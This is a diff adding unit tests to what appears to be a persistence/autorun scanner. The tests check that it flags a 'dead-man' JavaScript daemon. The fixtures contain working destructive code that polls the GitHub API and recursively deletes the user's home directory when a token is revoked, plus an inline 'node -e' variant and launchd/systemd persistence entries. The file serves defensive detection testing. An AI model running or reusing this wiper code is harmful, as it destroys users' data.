@@ -125,6 +125,92 @@ class TestFusionGrading(_Surface):
         self.assertTrue(ids & models.ROTATION_UNSAFE_IDS)
 
 
+# The Mini Shai-Hulud dead-man daemon: polls a LEGITIMATE endpoint (api.github.com every 60s) and wipes
+# $HOME when the token is revoked. Plain code — NOT a decode→exec dropper — so it is caught by FUSING the
+# destructive detector (#1334) into the autorun grading, and NEVER by a destination blocklist.
+_DEADMAN = ("const os=require('os'),fs=require('fs');\n"
+            "setInterval(async()=>{\n"
+            "  const r=await fetch('https://api.github.com/user',{headers:{authorization:tok}});\n"
+            "  if(r.status===401) fs.rmSync(os.homedir(),{recursive:true,force:true});\n"
+            "},60000);\n")
+# A benign timer daemon: same legitimate endpoint, same 60s cadence, same non-interactive origin — but
+# no destructive behaviour. The behavioural features it SHARES with the wiper must not flag it.
+_BENIGN_TIMER = ("const https=require('https');\n"
+                 "setInterval(()=>{ https.get('https://api.github.com/repos/x/y/releases/latest'); },60000);\n")
+
+
+class TestDeadmanDaemon(_Surface):
+    """#1335 — a malicious daemon polling a legitimate endpoint can't be caught by WHERE it connects.
+    The discriminating features are behavioural and, for a script-based daemon, STATIC: the poll cadence
+    is a literal in the artifact, and a persistence entry is non-interactive by construction. Detection
+    fuses the dead-man self-destruct (#1334) with the autorun context — no destination blocklist."""
+
+    def _run(self, **patches):
+        with mock.patch(f"{_ATTR}._package_owner", return_value=patches.get("owner")), \
+             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
+             mock.patch(f"{_ATTR}._codesigned", return_value=patches.get("signed")):
+            return check_autorun()
+
+    def test_deadman_direct_script_is_a_foothold(self):
+        (self.d / "gh-token-monitor.js").write_text(_DEADMAN)
+        self.write("m.plist", ProgramArguments=[str(self.d / "gh-token-monitor.js")],
+                   RunAtLoad=True, StartInterval=60)
+        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))
+
+    def test_deadman_laundered_through_trusted_interpreter_is_a_foothold(self):
+        # `node /path/daemon.js`: argv[0] is the TRUSTED interpreter (signed → attributed), but node's
+        # trust does not vouch for the script it runs — the daemon's code is still read and flagged.
+        (self.d / "daemon.js").write_text(_DEADMAN)
+        self.write("m.plist", ProgramArguments=["/usr/bin/node", str(self.d / "daemon.js")],
+                   RunAtLoad=True, StartInterval=60)
+        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=True)))  # node attributed
+
+    def test_deadman_reason_names_the_behaviour_not_the_endpoint(self):
+        (self.d / "d.js").write_text(_DEADMAN)
+        self.write("m.plist", ProgramArguments=[str(self.d / "d.js")], RunAtLoad=True, StartInterval=60)
+        (entry,) = surface.enumerate_entries()
+        sig = grade.content_signal(entry, read_referenced=True)
+        self.assertTrue(sig.hit)
+        self.assertTrue(any("self-destruct" in r for r in sig.reasons))      # the dead-man shape
+        self.assertTrue(any("short poll interval (60s)" in r for r in sig.reasons))  # static cadence
+        self.assertFalse(any("github" in r.lower() for r in sig.reasons))    # NOT keyed on the endpoint
+
+    def test_benign_timer_daemon_is_not_decisive(self):
+        # FP guard: a benign daemon sharing every behavioural feature the wiper has EXCEPT the
+        # destructive payload — polls the same endpoint on the same cadence, non-interactive — must NOT
+        # produce a decisive content hit. (Periodicity + non-interactive alone are never malicious.)
+        (self.d / "updater.js").write_text(_BENIGN_TIMER)
+        self.write("u.plist", ProgramArguments=["/usr/bin/node", str(self.d / "updater.js")],
+                   StartInterval=60)
+        (entry,) = surface.enumerate_entries()
+        sig = grade.content_signal(entry, read_referenced=True)
+        self.assertFalse(sig.hit)                                            # not decisive
+        self.assertFalse(any("self-destruct" in r for r in sig.reasons))    # no dead-man reason
+        # a signed, attributed interpreter running this benign polling script is CLEAN end-to-end
+        self.assertEqual(self._run(signed=True), [])
+
+    def test_inline_eval_payload_is_scanned_not_chased_as_a_path(self):
+        # `node -e '<code>'`: the payload is inline in argv (seen via shape_text), not a file. The
+        # dead-man shape is still caught, and _payload_path does NOT mistake the code for a phantom path.
+        inline = "const os=require('os'),fs=require('fs');fs.rmSync(os.homedir(),{recursive:true});"
+        entry = surface.AutorunEntry(location="launch-agent", path=Path("/x.plist"),
+                                     argv=["/usr/bin/node", "-e", inline], body="")
+        self.assertEqual(grade._payload_path(entry), "/usr/bin/node")   # no phantom path from -e
+        self.assertFalse(grade.launched_via_interpreter(entry))
+        self.assertTrue(grade.content_signal(entry).hit)               # still caught via shape_text
+
+    def test_short_poll_interval_read_from_systemd_timer(self):
+        (self.d / "d.js").write_text(_DEADMAN)
+        (self.d / "w.service").write_text(
+            f"[Service]\nExecStart=/usr/bin/node {self.d / 'd.js'}\n"
+            "[Timer]\nOnUnitActiveSec=60\n[Install]\nWantedBy=default.target\n")
+        # find the .service entry and confirm the systemd cadence is parsed as a short poll interval
+        entries = surface.enumerate_entries()
+        svc = next(e for e in entries if e.path.name == "w.service")
+        sig = grade.content_signal(svc, read_referenced=True)
+        self.assertTrue(any("short poll interval (60s)" in r for r in sig.reasons))
+
+
 class TestNoveltyReview(_Surface):
     def _run(self):
         with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
